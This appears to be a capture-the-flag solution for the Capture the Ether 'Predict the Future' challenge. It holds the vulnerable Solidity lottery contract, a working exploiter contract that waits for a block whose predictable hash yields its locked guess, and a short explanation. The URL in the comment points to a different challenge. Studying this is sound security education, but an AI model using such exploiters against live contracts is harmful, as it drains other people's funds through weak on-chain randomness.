pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheFutureChallengeExploiter {
    PredictTheFutureChallenge private predictTheFutureChallenge;

    function PredictTheFutureChallengeExploiter(
        PredictTheFutureChallenge _address
    ) public payable {
        require(msg.value == 1 ether);
        predictTheFutureChallenge = PredictTheFutureChallenge(_address);
    }

    function setGuess() external {
        predictTheFutureChallenge.lockInGuess.value(1 ether)(0);
    }

    function exploit() external {
        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;
        if (answer == 0) {
            predictTheFutureChallenge.settle();
        }
    }

    function() payable {}
}

// https://capturetheether.com/challenges/lotteries/guess-the-secret-number/

// Solution
// Here you are supposed to guess a future value. But that guess can only
// be one of 0-9. This future value is represented by a fixed logic for each block.
// We write an exploiter contract and make it guess a value 0 initially. Then for every block,
// we make it calculate the correct guess for that block. If it matches the initially guessed
// value, we make the exploiter contract call the settle function. We repeat this logic for every block
// till a match eventually happens.
